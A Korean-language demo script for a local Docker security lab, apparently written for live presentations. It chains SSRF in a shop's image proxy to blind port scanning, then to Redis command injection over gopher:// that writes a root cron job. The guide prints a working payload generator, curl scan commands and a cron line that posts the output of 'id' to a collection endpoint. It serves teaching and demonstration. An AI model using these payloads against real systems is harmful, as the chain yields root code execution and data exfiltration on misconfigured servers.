# 시연 가이드 (SSRF → Redis(root) → Cron RCE)

이 문서는 `README.md`의 기술 문서를 바탕으로, 실제로 화면 앞에서 시연할 때 순서대로 따라 할 수 있도록
정리한 실습 스크립트입니다. 쇼핑몰(`ec-site`) 화면은 **일본어 UI + 엔화(¥) 표시**로 되어 있습니다.

> ⚠️ 반드시 격리된 로컬 Docker 환경에서만 실행하세요. 이 문서에 나오는 모든 명령/페이로드는
> `lab-rb` 프로젝트가 만든 자체 컨테이너(`localhost:8080`, 내부망 `proxy-server.internal`)만을
> 대상으로 합니다.

## 0. 사전 준비

```bash
cd lab-rb
docker compose up --build -d   # 최초 빌드 + 백그라운드 기동
docker compose ps              # ec-site, proxy-server 두 컨테이너 모두 Up 확인
```

브라우저에서 `http://localhost:8080` 접속 → 일본어 쇼핑몰 홈 화면(상품 그리드, ¥ 가격)이 보이면 준비 완료.

문제가 생기면 언제든 초기화:

```bash
docker compose down -v && docker compose up --build -d
```

---

## 1단계 — 정상 사용자 흉내내기 (회원가입 → 로그인 → 장바구니)

공격 전에, 이 사이트가 "평범한 이커머스"로 보인다는 것부터 보여줍니다.

1. `http://localhost:8080` → 상단 네비게이션 **新規登録**(회원가입) 클릭 → 이메일/비밀번호 입력 후 가입.
2. 자동으로 **ログイン**(로그인) 페이지로 이동 → 방금 만든 계정으로 로그인.
3. 상품 하나 클릭 → 상세 페이지에서 **カートに入れる**(장바구니 담기) → 상단 **カート**(장바구니) 클릭.
4. 수량 변경/삭제가 정상 동작하는 것을 보여준 뒤 **注文する**(주문하기) → 이름/주소 입력 →
   **注文を確定する**(주문 확정) → "ご注文が完了しました。"(주문 완료) 화면 확인.

> 이 단계의 목적은 "특별한 것 없는 평범한 쇼핑몰"이라는 인상을 주는 것입니다. 실제 취약점은
> 다음 단계부터 시작됩니다.

---

## 2단계 — 정찰 + SSRF: "상품 이미지 자동 로딩"에 숨어있는 취약점 (취약점 ①)

여기서부터가 핵심입니다. **버튼을 누르는 명시적인 "미리보기" 기능이 아니라, 상품 이미지가
페이지를 열기만 해도 자동으로 로드되는 과정 자체에 정찰 지점과 SSRF가 함께 숨어 있습니다.**

### 2-1. 자동 호출 + Via 헤더 확인 (정찰)

1. 로그인 후 홈(`/`) 또는 아무 상품 상세 페이지를 열고 개발자도구(F12) → Network 탭을 켭니다.
2. 이미지 요청들을 보면 전부 다음과 같은 형태입니다:

   ```
   GET /product/image?url=http://ec-site/static/img/products/p1.svg
   GET /product/image?url=http://ec-site/static/img/products/p2.svg
   ...
   ```

   → 즉 브라우저가 이미지를 직접 받아오는 게 아니라, **매 페이지 로드마다 서버(`ec-site`)가 `url`
   파라미터로 대신 이미지를 가져와서 응답**하고 있습니다. 이건 실제 서비스에서 흔히 쓰는 "이미지
   썸네일/CDN 프록시" 패턴을 흉내 낸 것이며, 사용자는 이 사실을 전혀 알 수 없습니다.
3. 방금 뜬 이미지 요청 중 하나를 클릭 → Response Headers 확인:

   ```
   Via: 1.1 proxy-server.internal (squid/6.9)
   ```

   → 이 요청은 사내 정책에 따라 Squid(`proxy-server.internal:3128`)를 거쳐 나가고, Squid가 표준
   동작으로 붙이는 `Via` 헤더가 필터링 없이 그대로 전달됩니다. **버튼을 누른 적도 없이 페이지를 한 번
   연 것만으로 공격자는 내부 호스트명 `proxy-server.internal`을 알아냅니다.**

### 2-2. SSRF 확인 + 블라인드 포트 스캔

`url` 파라미터를 그대로 브라우저 주소창에 복사해 다른 값으로 바꿔서 요청해봅니다. 개발자가 "프록시를
거치니 안전하다"고 여겼겠지만, Squid ACL이 목적지를 전혀 제한하지 않아(취약점 ③) 내부망 어디든 자유롭게
요청을 보낼 수 있습니다.

```bash
# open (Redis, 6379) — 열려있지만 HTTP가 아님 → 빠르게 200
curl -s -o /dev/null -w "%{http_code} (%{time_total}s)\n" \
  "http://localhost:8080/product/image?url=http://proxy-server.internal:6379"

# closed (sshd 미설치, 22) — 빠르게 502
curl -s -o /dev/null -w "%{http_code} (%{time_total}s)\n" \
  "http://localhost:8080/product/image?url=http://proxy-server.internal:22"

# filtered (internal-net 대역 172.28.99.0/24 안의 존재하지 않는 IP) — 약 3초 후 504
curl -s -o /dev/null -w "%{http_code} (%{time_total}s)\n" \
  "http://localhost:8080/product/image?url=http://172.28.99.254:9999"
```

| 상태 | 응답 코드 | 응답 시간 | 판별 근거 |
|---|---|---|---|
| open (6379) | 200 | 매우 빠름 | Squid가 응답은 받았지만 HTTP가 아님(`X-Squid-Error: ERR_ZERO_SIZE_OBJECT`) |
| closed (22) | 502 | 매우 빠름 | Squid의 TCP 연결 자체가 거부됨(`X-Squid-Error: ERR_CONNECT_FAIL`) |
| filtered | 504 | 약 3초 | Squid의 연결 시도가 끝나기 전에 ec-site 쪽 3초 타임아웃이 먼저 만료 |

> ⚠️ filtered 테스트용 IP는 반드시 `172.28.99.0/24`(internal-net 서브넷) **안의** 미사용 주소를
> 써야 합니다. 서브넷 밖의 임의 IP(예: `10.255.255.1`)는 즉시 "no route" 오류로 실패해 3초 지연이
> 재현되지 않습니다.

이 세 가지 응답 패턴 차이만으로 공격자는 방화벽 뒤 내부망의 포트 상태를 원격에서 추측할 수 있습니다
("블라인드" 포트 스캔). `gopher://` 스킴은 `requests`가 지원하지 않아 raw 소켓으로 직접 처리되는데,
이 분기는 애초에 Squid를 거치지 않으므로 다음 단계의 Redis 명령 스머글링은 프록시와 무관하게 그대로
가능합니다.

---

## 3단계 — Redis 명령 스머글링 (gopher://) → cron에 RCE 페이로드 주입 (취약점 ②)

6379 포트가 열려 있다는 것을 확인했으니, `gopher://` 스킴으로 Redis 프로토콜 명령을 직접 주입합니다.

### 3-1. 페이로드 생성 스크립트

```bash
python3 - <<'EOF'
import urllib.parse, urllib.request

# 선행 \n 필수: Redis RDB 파일의 바이너리 헤더 안에 우연히 개행(0x0a)이 섞여 있어,
# \n으로 한 번 끊어주지 않으면 cron 스케줄이 바이너리 쓰레기와 같은 줄에 붙어 파싱이 실패함.
cron_line = "\n* * * * * curl -s -X POST -d \"$(id)\" http://ec-site/internal/collect\n"

def resp_cmd(*args):
    out = f"*{len(args)}\r\n"
    for a in args:
        out += f"${len(a)}\r\n{a}\r\n"
    return out

cmds = (
    resp_cmd("CONFIG", "SET", "dir", "/etc/crontabs")
    + resp_cmd("CONFIG", "SET", "dbfilename", "root")
    + resp_cmd("SET", "payload", cron_line)
    + resp_cmd("SAVE")
)

gopher_url = "gopher://proxy-server.internal:6379/_" + urllib.parse.quote(cmds)
target = "http://localhost:8080/product/image?url=" + urllib.parse.quote(gopher_url, safe="")

print("[*] 전송할 URL:")
print(target)
print()
print("[*] 전송 중...")
resp = urllib.request.urlopen(target, timeout=10)
print("[*] 응답:", repr(resp.read().decode('latin-1')))
EOF
```

**응답이 `'+OK\r\n+OK\r\n+OK\r\n+OK\r\n'` (성공 4개)이면 주입 성공입니다.**

### 3-2. 파일 생성 확인 (선택, 시연용)

```bash
docker exec lab-rb-proxy-server-1 ls -l /etc/crontabs/root
```

방금 시각으로 mtime이 갱신되고 소유자가 root인 것을 확인합니다 (attacker는 proxy-server 컨테이너에
직접 접속한 적이 없다는 점을 강조하세요 — 이 `docker exec`는 시연자가 "증거"를 보여주기 위한 것일 뿐,
공격 경로의 일부가 아닙니다).

---

## 4단계 — RCE 콜백 확인 (root 권한 코드 실행 증명)

busybox crond가 파일 교체(Redis의 원자적 rename)를 감지해 최대 1분 내로 주입된 cron 항목을 실행합니다.

```bash
# 60~90초 대기 후:
curl -s "http://localhost:8080/internal/results?format=json" | python3 -m json.tool
```

또는 브라우저로 `http://localhost:8080/internal/results` 접속.

**성공 시 다음과 같은 결과가 매분 하나씩 쌓입니다:**

```json
{
  "id": 35,
  "created_at": "2026-09-14 03:51:00",
  "source_ip": "172.25.0.2",
  "payload": "{\"uid\": \"0(root) gid=0(root) groups=0(root),...\"}"
}
```

- `uid=0(root)`가 보이면 킬체인 완성입니다: **공격자는 proxy-server에 단 한 번도 직접 연결하지 않고,
  SSRF(취약점 ①) → Redis 미인증 명령 주입(취약점 ②) → cron RCE까지 root 권한 코드 실행에
  성공했습니다.** 결과는 ec-site의 무인증 콜백 엔드포인트(`/internal/collect`)로 전달되어 조회한
  것입니다.
- 1분마다 계속 콜백이 쌓이는 것도 정상입니다 (cron이 `* * * * *`로 계속 실행 중이라는 뜻).

### 만약 60~90초가 지나도 결과가 안 뜨면

- crond가 컨테이너 기동 직후 기본 크론탭을 이미 메모리에 로드한 상태에서 Redis가 파일을 rename으로
  교체한 경우, 드물게 재파싱 타이밍을 놓칠 수 있습니다. 다음으로 강제 재기동해서 재확인하세요:

  ```bash
  docker exec lab-rb-proxy-server-1 sh -c 'kill -9 $(pgrep crond); sleep 1; crond'
  ```

  이후 다시 60~90초 대기 후 `/internal/results`를 확인합니다.

---

## 5단계 — 정리 및 리셋

```bash
docker compose down -v   # 컨테이너 + 볼륨 완전 삭제 (DB, 주입된 크론탭 등 모두 초기화)
```

다음 시연을 위해서는 `docker compose up --build -d`로 처음부터 다시 시작하면 됩니다.

---

## 요약: 킬체인 한눈에 보기

```
① 정찰 + SSRF            상품 이미지 "자동 로딩" 과정 자체가 Via 헤더로
   (같은 지점에 공존)       내부 호스트명을 흘리는 동시에, 목적지 검증 없는
                          서버발 임의 URL 요청 기능이었음 → 포트 스캔 가능
        │
        ▼
② Redis 미인증 + root     SSRF로 확보한 유일한 경로로 gopher:// 스킴을 통해
   실행 (RCE 삽입)         Redis 명령을 주입 → cron 파일을 임의로 덮어씀
        │
        ▼
③ cron RCE 실행 + 콜백    busybox crond가 최대 1분 내 root 권한으로 명령 실행
                          → 결과는 무인증 콜백 엔드포인트로 회수 (직접 연결 없이)
```

각 단계의 상세한 원리와 "올바른 운영 설정"은 `README.md`를 참고하세요.
